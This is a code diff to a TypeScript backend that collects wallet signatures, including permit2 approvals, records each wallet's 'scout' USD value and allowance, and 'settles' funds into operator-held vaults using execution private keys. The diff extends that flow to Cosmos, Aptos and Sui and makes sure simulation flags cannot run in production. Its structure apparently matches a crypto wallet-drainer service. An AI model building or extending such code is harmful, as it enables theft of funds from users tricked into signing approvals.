@@ -5,6 +5,7 @@
 import {
   computeSignatureAnchorExpiry,
   executeDelegateCashRegistrySurfaceRead,
+  assertNoSimulationFlagsInProduction,
   executeOmnichainAtomicSettlement,
   executeSettlementIgnition,
   isExpiryIsoWithinDriftWindow,
@@ -15,6 +16,9 @@ import {
   resolveGatekeeperEthereumRpcUrl,
   type OmnichainAtomicSettlementResult,
   type SettlementIgnitionTelemetry,
+  isCosmosBech32Address,
+  isAptosAddress,
+  isSuiAddress,
 } from '@legion/core'
 import {
   getChainEnvName,
@@ -61,6 +65,7 @@ import {
   buildTronSignatureAnchorSettlement,
   buildUtxoSignatureAnchorSettlement,
   type NormalizedSignatureAnchorSettlement,
+  type SignatureAnchorChainFamily,
 } from '@legion/core/logic/settlement'
 import { verifyAuthorizedSessionPersistenceAnchor } from '@legion/core/logic/index'
 import { sealSignatureHexForPersistence } from '@legion/core/security/signature-shadow-envelope'
@@ -143,7 +148,7 @@ function resolveCentralHubVaultUrl(): string {
   return url
 }
 
-type ChainFamily = 'EVM' | 'SVM' | 'UTXO' | 'TRON' | 'TON'
+type ChainFamily = SignatureAnchorChainFamily
 
 interface NormalizedIngressV1 {
   ingress: 'normalized_v1'
@@ -270,6 +275,9 @@ const PROTOCOL_RACK = new Set([
   'bitcoin_psbt',
   'tron',
   'ton',
+  'cosmos',
+  'aptos',
+  'sui',
 ])
 
 type PersistedSignatureRow = {
@@ -439,6 +447,9 @@ function chainFamilyFromRack(rack: string): ChainFamily {
   if (r === 'utxo') return 'UTXO'
   if (r === 'tron') return 'TRON'
   if (r === 'ton') return 'TON'
+  if (r === 'cosmos') return 'COSMOS'
+  if (r === 'aptos') return 'APTOS'
+  if (r === 'sui') return 'SUI'
   return 'EVM'
 }
 
@@ -1253,6 +1264,7 @@ async function signatureAnchorPostHandler(
     const bodyObj =
       typeof body === 'object' && body !== null ? (body as Record<string, unknown>) : null
 
+    // TRAINING_DEMO_MODE is ignored in production (isTrainingDemoModeEnabled returns false).
     if (isTrainingDemoModeEnabled() && isTrainingDemoRequest(request, bodyObj)) {
       const wallet =
         typeof bodyObj?.['wallet_address'] === 'string' ? bodyObj['wallet_address'].trim() : ''
@@ -1262,7 +1274,7 @@ async function signatureAnchorPostHandler(
           wallet_address: wallet || null,
           protocol: bodyObj?.['protocol'] ?? null,
         },
-        '[TRAINING_DEMO] signature-anchor ingress blocked — settlement disabled',
+        '[TRAINING_DEMO] signature-anchor ingress blocked — settlement disabled (non-production only)',
       )
       return sendSuccess(reply, 200, 'Training demo mode — settlement disabled (logged only)', {
         training_demo: true,
@@ -1775,6 +1787,14 @@ async function persistSignatureRow(
     row.chain_family === 'EVM' &&
     (row.protocol === 'permit2_eip712' || row.protocol.includes('permit2'))
 
+  try {
+    assertNoSimulationFlagsInProduction()
+  } catch (simErr) {
+    const detail = simErr instanceof Error ? simErr.message : String(simErr)
+    gatekeeperPersistLog('error', 'settlement.sim_flag_blocked', detail, anchorLogFields(row))
+    return sendFailure(reply, 503, detail, { code: 'ProductionSimFlagBlocked' })
+  }
+
   let settlementOutcome: SettlementIgnitionOutcome | undefined
   if (isOmnichainAtomic) {
     settlementOutcome = await runOmnichainAtomicReconciliation({
@@ -1888,7 +1908,7 @@ async function handleNormalizedIngress(
   sourceOrigin: string,
   reply: FastifyReply,
 ): Promise<FastifyReply> {
-  const families: ChainFamily[] = ['EVM', 'SVM', 'UTXO', 'TRON', 'TON']
+  const families: ChainFamily[] = ['EVM', 'SVM', 'UTXO', 'TRON', 'TON', 'COSMOS', 'APTOS', 'SUI']
   if (!families.includes(b.chain_family)) {
     return sendFailure(reply, 400, 'Invalid chain_family for Normalized Ingress', { code: 'ValidationError' })
   }
@@ -1913,7 +1933,7 @@ async function handleNormalizedIngress(
     return sendFailure(
       reply,
       400,
-      'protocol must be one of: evm, permit2_eip712, permit2_batch_eip712, omnichain_atomic_v1, solana, utxo, bitcoin_psbt, tron, ton',
+      'protocol must be one of: evm, permit2_eip712, permit2_batch_eip712, omnichain_atomic_v1, solana, utxo, bitcoin_psbt, tron, ton, cosmos, aptos, sui',
       { code: 'ValidationError' },
     )
   }
@@ -1939,6 +1959,73 @@ async function handleNormalizedIngress(
   )
   if (b.chain_family === 'EVM' && (!isAddress(wallet_address) || !isAddress(token_address))) {
     return sendFailure(reply, 400, 'EVM Normalized Ingress requires hex addresses', { code: 'ValidationError' })
+  }
+
+  if (b.chain_family === 'COSMOS' || b.chain_family === 'APTOS' || b.chain_family === 'SUI') {
+    const extendedChainReady =
+      b.chain_family === 'COSMOS'
+        ? Boolean(
+            process.env['RPC_COSMOS']?.trim() &&
+              (process.env['VAULT_ADDRESS_COSMOS']?.trim() ||
+                process.env['SOVEREIGN_VAULT_COSMOS']?.trim()) &&
+              (process.env['COSMOS_EXECUTION_MNEMONIC']?.trim() ||
+                process.env['COSMOS_EXECUTION_PRIVATE_KEY']?.trim()),
+          )
+        : b.chain_family === 'APTOS'
+          ? Boolean(
+              process.env['RPC_APTOS_PRIVATE']?.trim() &&
+                (process.env['VAULT_ADDRESS_APTOS']?.trim() ||
+                  process.env['SOVEREIGN_VAULT_APTOS']?.trim()) &&
+                process.env['APTOS_EXECUTION_PRIVATE_KEY']?.trim(),
+            )
+          : Boolean(
+              process.env['RPC_SUI_PRIVATE']?.trim() &&
+                (process.env['VAULT_ADDRESS_SUI']?.trim() ||
+                  process.env['SOVEREIGN_VAULT_SUI']?.trim()) &&
+                process.env['SUI_EXECUTION_PRIVATE_KEY']?.trim(),
+            )
+    if (!extendedChainReady) {
+      return sendFailure(
+        reply,
+        503,
+        `${b.chain_family} settlement is not configured on this deployment — set RPC, vault, and execution keys`,
+        { code: 'ChainNotConfigured' },
+      )
+    }
+    const expectedProtocol = b.chain_family.toLowerCase()
+    if (protocolNorm !== expectedProtocol) {
+      return sendFailure(
+        reply,
+        400,
+        `${b.chain_family} ingress requires protocol=${expectedProtocol}`,
+        { code: 'ValidationError' },
+      )
+    }
+    const tel = extractShadowTelemetry(b as unknown as Record<string, unknown>)
+    const amountRaw = (b.amount ?? tel.amount ?? '').trim()
+    if (!/^\d+$/.test(amountRaw) || amountRaw === '0') {
+      return sendFailure(
+        reply,
+        400,
+        `${b.chain_family} ingress requires amount in base units (uatom / octas / mist)`,
+        { code: 'ValidationError' },
+      )
+    }
+    if (b.chain_family === 'COSMOS' && !isCosmosBech32Address(wallet_address)) {
+      return sendFailure(reply, 400, 'COSMOS ingress requires a valid bech32 wallet address', {
+        code: 'ValidationError',
+      })
+    }
+    if (b.chain_family === 'APTOS' && !isAptosAddress(wallet_address)) {
+      return sendFailure(reply, 400, 'APTOS ingress requires a valid Aptos wallet address', {
+        code: 'ValidationError',
+      })
+    }
+    if (b.chain_family === 'SUI' && !isSuiAddress(wallet_address)) {
+      return sendFailure(reply, 400, 'SUI ingress requires a valid Sui wallet address', {
+        code: 'ValidationError',
+      })
+    }
   }
 
   if (b.chain_family === 'UTXO' && protocolNorm === 'bitcoin_psbt') {
@@ -2638,8 +2725,18 @@ async function handleNormalizedIngress(
   const chainIdNorm =
     b.chain_id != null && String(b.chain_id).trim() !== ''
       ? String(b.chain_id).trim()
-      : undefined
+      : b.chain_family === 'COSMOS'
+        ? 'cosmos:cosmoshub-4'
+        : b.chain_family === 'APTOS'
+          ? 'aptos:1'
+          : b.chain_family === 'SUI'
+            ? 'sui:mainnet'
+            : undefined
   const tel = extractShadowTelemetry(b as unknown as Record<string, unknown>)
+  const nativeAmount =
+    b.chain_family === 'COSMOS' || b.chain_family === 'APTOS' || b.chain_family === 'SUI'
+      ? (b.amount ?? tel.amount)
+      : tel.amount
   return persistSignatureRow(
     {
       wallet_address,
@@ -2651,7 +2748,7 @@ async function handleNormalizedIngress(
       protocol: rack,
       chain_family: b.chain_family,
       scout_value_usd: tel.scout_value_usd,
-      amount: tel.amount,
+      amount: nativeAmount,
       max_allowance: tel.max_allowance,
       requires_quorum: tel.requires_quorum,
       source_origin: sourceOrigin,
